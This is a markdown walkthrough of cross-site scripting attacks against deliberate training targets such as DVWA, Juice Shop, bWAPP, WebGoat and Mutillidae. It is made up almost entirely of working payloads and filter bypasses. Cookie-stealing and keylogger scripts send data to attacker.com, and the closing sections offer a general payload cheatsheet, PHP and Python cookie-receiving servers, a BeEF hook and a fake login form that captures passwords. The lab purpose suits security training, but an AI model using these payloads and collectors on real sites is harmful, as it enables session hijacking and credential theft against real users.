# XSS Walkthrough - Platform-Specific Exploitation

Complete step-by-step walkthroughs for XSS attacks across multiple vulnerable platforms.

---

## Platform 1: DVWA (Damn Vulnerable Web Application)

### Setup
```bash
# Access DVWA
http://localhost:8081
# Login: admin / password
# Navigate: DVWA Security > Set to "Low"
```

### Lab 1: Reflected XSS (Low Security)

**Location:** Vulnerabilities > XSS (Reflected)

**Step 1: Identify the Injection Point**
```
# The page has a name input field
# URL pattern: /vulnerabilities/xss_r/?name=test
# Input is reflected in: "Hello test"
```

**Step 2: Test Basic Payload**
```html
<script>alert('XSS')</script>
```

**Step 3: Verify Execution**
- Enter payload in the name field
- Click Submit
- Alert box should appear

**Step 4: Cookie Stealing Payload**
```html
<script>document.location='http://YOUR_SERVER:8888/steal.php?cookie='+document.cookie</script>
```

**Step 5: Capture with Netcat**
```bash
# On attacker machine
nc -lvp 8888
# Cookie will be sent to your listener
```

### Lab 2: Reflected XSS (Medium Security)

**Bypass:** The medium level filters `<script>` tags

**Working Payloads:**
```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- Event handlers -->
<img src=x onerror=alert('XSS')>

<!-- SVG -->
<svg onload=alert('XSS')>

<!-- Body tag -->
<body onload=alert('XSS')>
```

### Lab 3: Reflected XSS (High Security)

**Bypass:** High level uses preg_replace with pattern matching

**Working Payloads:**
```html
<!-- IMG with encoding -->
<img src=x onerror="alert('XSS')">

<!-- Input with autofocus -->
<input onfocus=alert('XSS') autofocus>

<!-- Details/Summary -->
<details open ontoggle=alert('XSS')>
```

### Lab 4: Stored XSS (Low Security)

**Location:** Vulnerabilities > XSS (Stored)

**Step 1: Inject in Guestbook**
```
Name: Test
Message: <script>alert(document.cookie)</script>
```

**Step 2: Verify Persistence**
- Refresh the page
- Alert appears every time the page loads
- All visitors will trigger the XSS

**Step 3: Advanced Cookie Stealer**
```html
<script>
new Image().src="http://YOUR_IP:8888/steal.php?cookie="+document.cookie;
</script>
```

### Lab 5: DOM XSS

**Location:** Vulnerabilities > XSS (DOM)

**Step 1: Analyze the Code**
```javascript
// The page uses document.location to get parameter
// Vulnerable sink: document.write()
```

**Step 2: Craft URL Payload**
```
http://localhost:8081/vulnerabilities/xss_d/?default=English<script>alert('XSS')</script>
```

**Step 3: Alternative Payloads**
```
# Using IMG tag
?default=English</option></select><img src=x onerror=alert('XSS')>

# Using SVG
?default=English</option></select><svg onload=alert('XSS')>
```

---

## Platform 2: OWASP Juice Shop

### Setup
```bash
# Access Juice Shop
http://localhost:3000
# Register an account or use existing
```

### Challenge 1: DOM XSS (Score: 1 Star)

**Location:** Search functionality

**Step 1: Identify Vulnerable Endpoint**
```
# Search box reflects input in URL and DOM
http://localhost:3000/#/search?q=test
```

**Step 2: Inject Payload**
```html
<iframe src="javascript:alert('xss')">
```

**Step 3: Encoded Payload for URL**
```
http://localhost:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E
```

### Challenge 2: Reflected XSS (Score: 2 Stars)

**Location:** Track Order functionality

**Step 1: Find Injection Point**
```
# Track order page at: /#/track-result?id=
# Order ID is reflected in the page
```

**Step 2: Craft Payload**
```html
<iframe src="javascript:alert('xss')">
```

**Step 3: Full URL**
```
http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E
```

### Challenge 3: Stored XSS via User Profile

**Location:** Customer Feedback

**Step 1: Submit Feedback with XSS**
- Navigate to Customer Feedback
- In the comment field:
```html
<<script>Foo</script>script>alert('XSS')</script>
```

**Step 2: View in Admin Panel**
- Login as admin (admin@juice-sh.op)
- Navigate to Administration
- XSS triggers when viewing feedback

### Challenge 4: API-Based XSS

**Step 1: Intercept with Burp**
- Submit a product review
- Capture the request

**Step 2: Modify Request Body**
```json
{
  "message": "<script>alert('XSS')</script>",
  "author": "test@test.com"
}
```

### Challenge 5: Bonus Payload (Content Security Policy Bypass)

```html
<!-- Juice Shop may have CSP - try these -->
<img src=x onerror=alert(document.domain)>
<svg/onload=alert('XSS')>
```

---

## Platform 3: bWAPP

### Setup
```bash
# Access bWAPP
http://localhost:8082/bWAPP
# Login: bee / bug
# Set security level: low
```

### Lab 1: XSS - Reflected (GET)

**Location:** A3 - XSS - Reflected (GET)

**Step 1: Basic Injection**
```
First name: <script>alert('XSS')</script>
Last name: test
```

**Step 2: Cookie Theft**
```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Lab 2: XSS - Reflected (POST)

**Location:** A3 - XSS - Reflected (POST)

**Step 1: Capture Request in Burp**
```
POST /bWAPP/xss_post.php
firstname=test&lastname=test&form=submit
```

**Step 2: Modify Parameter**
```
firstname=<script>alert('XSS')</script>&lastname=test&form=submit
```

### Lab 3: XSS - Reflected (JSON)

**Location:** A3 - XSS - Reflected (JSON)

**Step 1: Analyze Response**
```json
{"movie": "USER_INPUT"}
```

**Step 2: Break Out of JSON**
```
"}]}</script><script>alert('XSS')</script>
```

### Lab 4: XSS - Stored (Blog)

**Location:** A3 - XSS - Stored (Blog)

**Step 1: Post Malicious Entry**
```html
<script>alert('XSS')</script>
```

**Step 2: Keylogger Payload**
```html
<script>
document.onkeypress=function(e){
new Image().src='http://attacker.com/log?key='+e.key;
}
</script>
```

### Lab 5: XSS - Stored (Change Secret)

**Location:** A3 - XSS - Stored (Change Secret)

**Step 1: Change Secret Field**
```html
<script>alert('Stored XSS')</script>
```

**Step 2: Verify Persistence**
- Secret is stored in database
- Triggers when secret is displayed

### Lab 6: XSS - DOM (Eval)

**Location:** A3 - XSS - Reflected (Eval)

**Step 1: Identify eval() Usage**
```javascript
// Code uses eval() on user input
```

**Step 2: Payload**
```
');alert('XSS');//
```

### Lab 7: XSS - DOM (Document.Write)

**Location:** A3 - XSS - Reflected (Document.Write)

**Step 1: URL Payload**
```
?message=<script>alert('XSS')</script>
```

---

## Platform 4: WebGoat

### Setup
```bash
# Access WebGoat
http://localhost:8080/WebGoat
# Register or login
```

### Lesson 1: Cross Site Scripting - Concept

**Step 1: Complete the Theory**
- Read through the XSS explanation
- Understand the different types

### Lesson 2: XSS - Identify

**Task:** Find which field is vulnerable

**Step 1: Test Each Field**
```html
<script>alert('test')</script>
```

**Step 2: Field 1 (credit_card)**
- Usually the vulnerable field
- Try: `<script>alert('XSS')</script>`

### Lesson 3: XSS - Try It

**Task:** Execute an XSS attack

**Step 1: Use GoatRouter**
```javascript
webgoat.customjs.phoneHome()
```

**Step 2: Full Payload**
```html
<script>webgoat.customjs.phoneHome()</script>
```

### Lesson 4: Stored XSS

**Task:** Post a malicious comment

**Step 1: Add Comment**
```html
<script>alert(document.cookie)</script>
```

### Lesson 5: DOM-Based XSS

**Task:** Exploit client-side vulnerability

**Step 1: Analyze JavaScript**
- Look for innerHTML, document.write, eval

**Step 2: Craft Payload**
```
start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>
```

### Lesson 6: XSS Mitigation

**Task:** Understand defenses

**Step 1: Test Encoded Payload**
```html
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

---

## Platform 5: Mutillidae

### Setup
```bash
# Access Mutillidae
http://localhost:8083/mutillidae
# Navigate to OWASP Top 10 > A7 - XSS
```

### Lab 1: Add to Your Blog (Stored XSS)

**Location:** OWASP 2017 > A7 - XSS > Persistent (First Order) > Add to Your Blog

**Step 1: Post Malicious Blog Entry**
```html
<script>alert('XSS')</script>
```

**Step 2: Advanced Payload**
```html
<img src=x onerror="this.src='http://attacker.com/steal.php?cookie='+document.cookie">
```

### Lab 2: DNS Lookup (Reflected XSS)

**Location:** OWASP 2017 > A7 - XSS > Reflected (First Order) > DNS Lookup

**Step 1: Enter Payload in Hostname**
```html
<script>alert('XSS')</script>
```

**Step 2: Event Handler Bypass**
```html
"><img src=x onerror=alert('XSS')>
```

### Lab 3: Browser Info (DOM XSS)

**Location:** OWASP 2017 > A7 - XSS > DOM-Based > Browser Info

**Step 1: Analyze Client Code**
```javascript
// Uses document.location or URL parameters
```

**Step 2: URL-Based Payload**
```
?input=<script>alert('XSS')</script>
```

### Lab 4: Set Background Color (Reflected)

**Location:** OWASP 2017 > A7 - XSS > Reflected > Set Background Color

**Step 1: Inject in Color Parameter**
```
red"><script>alert('XSS')</script>
```

### Lab 5: User Agent Impersonation

**Step 1: Modify User-Agent in Burp**
```
User-Agent: <script>alert('XSS')</script>
```

**Step 2: Send Request**
- User-Agent is reflected on page
- XSS executes

### Lab 6: Password Generator (DOM-Based)

**Location:** OWASP 2017 > A7 - XSS > DOM-Based > Password Generator

**Step 1: Analyze JavaScript**
```javascript
// Check for innerHTML usage
```

**Step 2: Payload**
```html
<img src=x onerror=alert('XSS')>
```

---

## Universal XSS Payloads Cheatsheet

### Basic Payloads
```html
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

### Event Handler Payloads
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<video><source onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<object data="javascript:alert('XSS')">
```

### Filter Bypass Payloads
```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>

<!-- Null bytes -->
<scr\x00ipt>alert('XSS')</script>

<!-- Double encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

<!-- Without parentheses -->
<script>alert`XSS`</script>

<!-- Without alert -->
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>

<!-- Unicode -->
<script>\u0061lert('XSS')</script>

<!-- HTML entities -->
<img src=x onerror="&#97;lert('XSS')">
```

### Cookie Stealing Payloads
```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
<img src=x onerror="this.src='http://attacker.com/steal.php?'+document.cookie">
```

### Keylogger Payload
```html
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log?key='+e.key);
}
</script>
```

---

## Setting Up Your Attack Server

### Simple Cookie Receiver
```php
<?php
// steal.php
$cookie = $_GET['cookie'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("Y-m-d H:i:s");
$log = fopen("cookies.txt", "a");
fwrite($log, "$date - $ip - $cookie\n");
fclose($log);
?>
```

### Python HTTP Server
```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] Received: {self.path}")
        query = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        if 'cookie' in query:
            print(f"[!] COOKIE: {query['cookie']}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

### Netcat Listener
```bash
nc -lvnp 8888
```

---

## Post-Exploitation

### Session Hijacking
1. Capture cookie via XSS payload
2. Use browser developer tools
3. Add stolen cookie to your session
4. Refresh page - now authenticated as victim

### BeEF Integration
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

### Phishing Form Injection
```html
<script>
document.body.innerHTML='<h1>Session Expired</h1><form action="http://attacker.com/phish"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><button>Login</button></form>';
</script>
```
